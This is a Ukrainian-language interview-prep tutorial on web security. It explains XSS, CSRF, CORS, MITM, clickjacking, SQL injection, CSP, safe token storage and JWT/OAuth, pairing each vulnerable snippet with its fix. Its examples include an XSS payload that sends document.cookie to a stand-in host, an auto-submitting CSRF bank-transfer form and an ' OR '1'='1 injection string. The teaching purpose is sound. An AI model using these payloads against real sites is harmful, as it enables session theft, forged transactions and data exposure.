XSS, CSRF, CORS, Man-in-the-Middle, Clickjacking, SQL injection

Чотири абревіатури, які на співбесіді майже завжди питають підряд — і майже завжди приймають відповідь-визначення. Різниця між "знає абревіатуру" й "розуміє механізм" видно в одному уточнювальному питанні: хто саме жертва й що конкретно в браузері чи мережі дозволяє атаці спрацювати.

XSS (Cross-Site Scripting) — зловмисний JavaScript виконується в браузері жертви в контексті довіреного сайту. Класичний приклад — stored XSS: застосунок зберігає коментар користувача як є і рендерить його як HTML замість тексту.

вразливо
// коментар від користувача: <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
element.innerHTML = comment.text; // браузер виконає onerror як звичайний JS

// безпечно — текст лишається текстом, HTML-теги не інтерпретуються
element.textContent = comment.text;

Жертва тут — будь-який інший користувач, що просто відкрив сторінку з цим коментарем; зловмисник ніколи не торкається їхнього браузера напряму, скрипт запускає сам браузер жертви. Головний захист — ніколи не вставляти сирий ввід користувача як HTML (textContent замість innerHTML, або санітизація/екранування, якщо HTML справді потрібен), плюс CSP як другий рубіж (розділ 2 нижче).

XSS — не один вид атаки, а три підтипи, які відрізняються саме тим, де й коли шкідливий скрипт потрапляє на сторінку — і на співбесіді часто просять назвати всі три, а не лише "stored":

ПідтипДе відбувається ін'єкціяКласичний приклад
StoredСкрипт зберігається на сервері (в БД) і віддається всім користувачам, що відкриють сторінку — постійна загроза, поки дані не почистятьКоментар з <script> у тілі, збережений і відрендерений як HTML
ReflectedСкрипт "відбивається" назад у відповіді на сам запит — не зберігається, працює лише якщо жертва перейде за спеціально сформованим посиланнямПошуковий запит із скриптом у query-параметрі, який сервер вставляє назад у HTML сторінки результатів без екранування
DOM-basedСервер узагалі не бере участі в ін'єкції — вразливий сам клієнтський JS, що бере дані з location.hash/URL і напряму вставляє їх у DOM (innerHTML) без жодного round-trip на серверelement.innerHTML = location.hash.slice(1) — зловмисне посилання з корисним навантаженням просто у фрагменті URL

CSRF (Cross-Site Request Forgery) — зловмисний сайт змушує браузер жертви відправити запит на інший сайт, де жертва вже автентифікована, використовуючи те, що браузер автоматично додає cookie до запиту незалежно від того, звідки завантажена сторінка, яка цей запит ініціює.

evil.example/page.html
<!-- жертва залогінена на bank.example, cookie сесії вже в браузері -->
<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>
<!-- браузер автоматично додасть cookie сесії bank.example до цього POST -->

Жертва тут — сам користувач, чиєю сесією зловживають без його відома. Основний захист — CSRF-токен, унікальний для сесії/форми, якого зловмисний сайт не може прочитати й підставити, плюс cookie з атрибутом SameSite=Lax чи Strict, що не дає браузеру взагалі відправити cookie в такому крос-сайтовому запиті.

CORS (Cross-Origin Resource Sharing) — тут важливо розуміти, що CORS не атака й не серверний захист сам по собі, а браузерний механізм, який за замовчуванням забороняє JS-коду з одного origin читати відповідь запиту до іншого origin, якщо той інший origin явно не дозволив це заголовком Access-Control-Allow-Origin. Запит технічно все одно йде на сервер (сервер його може навіть виконати) — CORS лише блокує браузеру віддати JS-коду відповідь. Тому CORS захищає користувача від читання чужих даних через браузер жертви, а не сервер від атаки як такої.

Простими словами. Спершу — що таке origin: це трійка протокол + домен + порт. https://app.example і https://api.example — вже різні origin (інший домен); http://app.example і https://app.example — теж різні (інший протокол); localhost:3000 і localhost:8000 — теж різні (інший порт). Саме тому фронтенд на Vite (:5173), що ходить на FastAPI (:8000), одразу впирається в CORS-помилку.

Базове правило браузера називається Same-Origin Policy: сторінка може надсилати запити куди завгодно, але читати відповідь — лише зі свого origin. CORS — це «дірка» в цьому правилі, яку відкриває сервер, а не клієнт: сервер у відповіді каже «цьому origin я дозволяю читати мої відповіді». Уявіть охоронця на виході з будівлі (браузер): лист (запит) виносити можна, але конверт із відповіддю він віддасть вам у руки лише якщо на ньому є штамп адресата «дозволено для app.example».

Preflight. Для «простих» запитів (GET/POST без кастомних заголовків, з Content-Type form/text) браузер шле запит одразу й лише потім перевіряє заголовок у відповіді. Для «непростих» — PUT/DELETE, Content-Type: application/json, заголовок Authorization — браузер спершу шле службовий запит OPTIONS («можна мені так?»), і лише якщо сервер відповів дозволом, відправляє справжній запит. Тому в DevTools часто видно два запити замість одного.

preflight: запит браузера → відповідь сервера
# 1. браузер сам, до вашого fetch()
OPTIONS /api/routes HTTP/1.1
Origin: https://app.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type

# 2. сервер дозволяє
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Allow-Credentials: true   # якщо потрібні cookie

# 3. лише тепер браузер шле справжній POST
⚠️
Типові помилки: Access-Control-Allow-Origin: * разом із cookie не працює — браузер вимагає конкретний origin, якщо Allow-Credentials: true. А «віддзеркалювати» будь-який Origin із запиту назад у відповідь — фактично вимкнути захист: тоді evil.example зможе читати приватні дані користувача. Використовуйте явний allowlist origin-ів.

Man-in-the-Middle (MITM) — атака на рівні мережі, а не браузера: зловмисник перехоплює трафік між клієнтом і сервером (незахищений Wi-Fi, скомпрометований роутер, підроблений DNS) і може читати чи підміняти дані в польоті. Жертва — обидві сторони з'єднання. Захист — HTTPS/TLS: шифрування робить перехоплений трафік нечитабельним і виявляє підміну сертифіката.

Clickjacking — зловмисник вбудовує цільовий сайт у невидимий (opacity:0) <iframe> поверх власної оманливої сторінки: користувач думає, що клікає на кнопку зловмисника ("виграти приз"), а насправді клік проходить крізь прозорий iframe і натискає реальну кнопку цільового сайту під ним (наприклад, "підтвердити переказ" чи "підписатись"). Жертва — автентифікований користувач цільового сайту. Захист — заборонити сайту взагалі бути вбудованим у чужий iframe: заголовок X-Frame-Options: DENY або сучасніша директива CSP frame-ancestors 'none'.

SQL injection — більше backend-тема, але її часто питають і фронтенд/full-stack кандидатів на рівні розуміння механізму: якщо ввід користувача підставляється в SQL-запит прямою конкатенацією рядків, зловмисник може дописати власну SQL-логіку прямо в запит.

вразливо vs безпечно
// вразливо: конкатенація перетворює ввід на частину SQL-синтаксису
const query = "SELECT * FROM users WHERE email = '" + email + "'";
// email = "' OR '1'='1" -> запит поверне ВСІХ користувачів

// безпечно: параметризований запит — email завжди лишається просто значенням
const query = "SELECT * FROM users WHERE email = $1";
db.query(query, [email]);

Правильний захист — параметризовані запити / prepared statements, а не спроби "заекранувати" небезпечні символи вручну: параметризація гарантує, що ввід ніколи не інтерпретується як частина SQL-синтаксису, незалежно від його вмісту.

Content Security Policy (CSP)

CSP — HTTP-заголовок відповіді (Content-Security-Policy), яким сервер каже браузеру: "виконуй скрипти й підвантажуй ресурси тільки з цих джерел, і ніяк інакше". Це другий рубіж захисту від XSS: навіть якщо десь у коді лишилась діра для ін'єкції, CSP може не дати впровадженому скрипту виконатись узагалі.

приклад заголовка
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.example.com;
  object-src 'none';

Тут script-src 'self' https://cdn.example.com означає: браузер виконає лише скрипти, завантажені з того самого origin або з довіреного CDN — інлайн-скрипт, впроваджений через XSS прямо в HTML (наприклад, <script>fetch(...)</script> всередині вкраденого коментаря), просто не виконається, навіть якщо він фізично потрапив у DOM. Це не закриває саму діру ін'єкції — воно суттєво звужує, що зловмисник може зробити, навіть якщо діра є.

⚠️
CSP — це захист у глибину (defense in depth), а не заміна правильної санітизації вводу. Директива 'unsafe-inline' у script-src (на відміну від style-src вище) звела б захист від XSS майже нанівець — саме тому інлайн-скрипти в сучасних CSP-налаштуваннях зазвичай заборонені за замовчуванням.
🟡

Безпечне зберігання токенів на практиці

Тема сховищ браузера (туторіалі 5) вже пояснює, чому localStorage ризикований для токенів. Тут — практичне рішення: як реально розподілити access/refresh токени між трьома доступними варіантами сховища.

Практична рекомендація, яку варто вміти обґрунтувати, а не просто назвати: довгоживучий refresh-токен — у httpOnly-cookie з SameSite=Lax (JS до нього взагалі не має доступу, тож XSS його вкрасти не може); короткоживучий access-токен (хвилини) — тримати лише в пам'яті застосунку (змінна модуля/стору, не персиститься), щоб навіть за успішної XSS-атаки зловмисник отримав токен з коротким вікном дії, а не безстрокову сесію. localStorage для будь-якого з двох токенів комбінує гірші сторони обох підходів — тому вважається антипатерном для SPA-автентифікації.

Ідеальна схема для SPA: хто де живе

Коротко: access-токен (JWT, 5–15 хв) — у пам'яті JS, шлеться заголовком Authorization: Bearer; refresh-токен (7–30 днів) — в httpOnly-cookie, яку браузер шле сам і лише на один ендпоінт /auth/refresh. Жоден токен не потрапляє ні в localStorage, ні в sessionStorage.

Що саме зберігає httpOnly-cookie. Лише одне значення: сам refresh-токен. Жодних ролей, email, імені користувача чи access-токена. На сервері йому відповідає запис (hash(token), user_id, family_id, expires_at, revoked). У БД кладуть саме хеш, як і пароль, щоб витік бази не дав робочих токенів. Атрибути cookie — це і є захист:

auth.js — клієнт SPA
// access-токен живе лише тут, у пам'яті модуля; жодного localStorage
let accessToken = null;
let refreshing = null; // один refresh на всі паралельні 401 одночасно

function refresh() {
  refreshing ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
    .then(r => { if (!r.ok) throw new Error('session expired'); return r.json(); })
    .then(data => { accessToken = data.access_token; })
    .finally(() => { refreshing = null; });
  return refreshing;
}

export async function api(url, options = {}) {
  if (!accessToken) await refresh(); // перший запит після reload = silent refresh
  const send = () => fetch(url, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
  });
  let res = await send();
  if (res.status === 401) { await refresh(); res = await send(); } // протух: оновили й повторили
  return res;
}

Ротація та виявлення повторного використання. Кожен /auth/refresh видає новий refresh і анулює старий. Якщо на сервер приходить вже використаний refresh, це означає, що токен хтось скопіював. Тоді сервер відкликає всю «сім'ю» (family_id) і розлоговує обидві сторони. Так навіть украдений refresh-токен живе лише до першого використання справжнім користувачем.

⚠️
Умови, без яких схема не працює: (1) SPA і API мають бути same-site: app.example.com + api.example.com підходять, а app.vercel.app + api.fly.dev — ні, бо браузери блокують third-party cookie. У такому разі проксуйте API під свій домен (/api). (2) CORS із явним origin і Access-Control-Allow-Credentials: true, а на клієнті — credentials: 'include'. (3) На /auth/refresh додатково перевіряйте заголовок Origin: це дешевий другий рубіж проти CSRF поверх SameSite.

Ще сильніший варіант — BFF (Backend-for-Frontend). Токени взагалі не потрапляють у браузер. Тонкий сервер на тому ж домені тримає access/refresh у себе, а SPA отримує лише звичайну httpOnly-cookie сесії. Це рекомендація OAuth 2.0 for Browser-Based Apps для застосунків з високими вимогами (фінанси, медицина). Ціна — ще один сервіс. Для більшості SPA достатньо схеми вище.

🎯
Що перевіряють насправді: чи розумієте ви компроміс, а не лише "правильну відповідь" — httpOnly-cookie сама по собі не панацея (вона відкриває поверхню для CSRF, яку закриває SameSite), тому безпека тут — комбінація двох механізмів, а не один "правильний" вибір сховища.
🟣

Auth: JWT, cookie-сесії, OAuth

Три терміни, які постійно згадують в одному реченні на співбесіді, хоча вони описують різні шари: формат токена (JWT), модель зберігання сесії (cookie-сесія) і протокол делегованого доступу (OAuth).

Структура JWT. Три частини, закодовані в base64url і розділені крапками: header.payload.signature. Header — алгоритм підпису й тип токена. Payload — самі claims (дані: userId, час видачі, час дії тощо) — важливо розуміти, що payload лише закодований, а не зашифрований: будь-хто може розкодувати base64url і прочитати вміст, тому в payload ніколи не кладуть паролі чи секрети. Signature — підпис, обчислений сервером із секретним ключем; саме він не дає підробити чи змінити перші дві частини непомітно. Де зберігати JWT на клієнті й чому — уже розібрано вище, у розділі 3 цього туторіалу.

Cookie-based session auth — альтернативна, а не гірша модель: сервер видає непрозорий (opaque) session ID у cookie, а самі дані сесії (claims, права доступу) зберігаються на сервері (в БД чи Redis) під цим ID. Головна практична перевага над JWT — реальний відкликаний доступ (revocation): щоб миттєво "розлогінити" користувача, достатньо видалити сесію на сервері. JWT сам по собі не можна достроково відкликати до завершення терміну дії — це вимагає додаткової інфраструктури (наприклад, blocklist відкликаних токенів), якої JWT спочатку мав уникнути самою ідеєю "stateless" токена.

OAuth — це протокол авторизації (делегованого доступу), а не автентифікації як такої: він відповідає на питання "дозволити застосунку X отримати доступ до частини моїх даних у сервісі Y, не віддаючи X свій пароль від Y" — а не "хто я". Саме тому кнопки "Увійти через Google/GitHub" технічно побудовані на OpenID Connect — тонкому шарі автентифікації (ідентичності) поверх OAuth, а не на самому "голому" OAuth. На практиці access-токен, який OAuth видає застосунку, дуже часто реалізований саме як JWT — тому ці дві теми на співбесіді й згадують поруч, хоча одна описує формат токена, а друга — протокол його видачі.

🎯
Що перевіряють насправді: чи розрізняєте ви ці три шари (формат токена / модель сесії / протокол видачі доступу) — і чи розумієте головний практичний компроміс JWT проти cookie-сесії: stateless-швидкість і відсутність запиту до БД на кожен запит, ціною втрати миттєвого відкликання доступу.
